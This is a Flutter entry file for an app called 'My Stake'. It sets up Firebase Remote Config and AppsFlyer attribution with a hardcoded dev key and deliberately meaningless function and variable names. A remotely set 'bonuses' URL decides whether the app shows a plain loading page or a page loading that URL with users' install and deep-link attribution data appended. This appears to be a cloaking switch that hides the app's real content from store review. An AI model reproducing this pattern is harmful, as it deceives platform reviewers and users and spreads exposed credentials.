import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:hive_flutter/adapters.dart';
import 'package:my_stake/screens/loading_screen.dart';
import 'package:my_stake/screens/mystery_box_screen.dart';
import 'package:my_stake/service/hive_service.dart';

import 'model/nn.dart';
import 'service/firebase_options.dart';

String datay = '';
late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String fds = '';
String dsaw = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await NotificationsActivation().activate();
  await hgfcdsf();
  await Hive.initFlutter();
  await Hive.openBox('myBox');
  await HiveService.initHive();
  runApp(const MyApp());
}

String jkh = '';

Future<void> hgfcdsf() async {
  final TrackingStatus asdaszas =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(asdaszas);
}

void hgfhgfj() async {
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'doJsrj8CyhTUWPZyAYTByE',
    appId: '6502615861',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );
  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    dsaw = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });
  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    fds = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });

  _appsflyerSdk.startSDK(
    onSuccess: () {
      _appsflyerSdk.logEvent("testEventNotForAnalytics", {
        "id": {'id': adId},
      });
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

Future<bool> dsafs() async {
  final fetchNx = FirebaseRemoteConfig.instance;
  await fetchNx.fetchAndActivate();
  hgfhgfj();
  String cdsfgsd = fetchNx.getString('bonuses');
  String cdsfgsdx = fetchNx.getString('newbonuses');
  if (!cdsfgsd.contains('zero')) {
    final client = HttpClient();
    final uri = Uri.parse(cdsfgsd);
    final request = await client.getUrl(uri);
    request.followRedirects = false;
    final response = await request.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      jkh = cdsfgsd;
      return true;
    }
  }
  return cdsfgsd.contains('zero') ? false : true;
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'My Stake',
      theme: ThemeData(fontFamily: 'Inter'),
      home: FutureBuilder<bool>(
        future: dsafs(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
              child: Center(
                child: Container(
                  height: 70,
                  width: 70,
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(15),
                    child: Image.asset('assets/image/1024.png'),
                  ),
                ),
              ),
            );
          } else {
            if (snapshot.data == true && jkh != '') {
              return MaterialApp(
                  debugShowCheckedModeBanner: false,
                  home: PrevPgae(
                    fdsfds: jkh,
                    dsadas: fds,
                    azasx: dsaw,
                  ));
            } else {
              return const LoadingPage();
            }
          }
        },
      ),
    );
  }
}
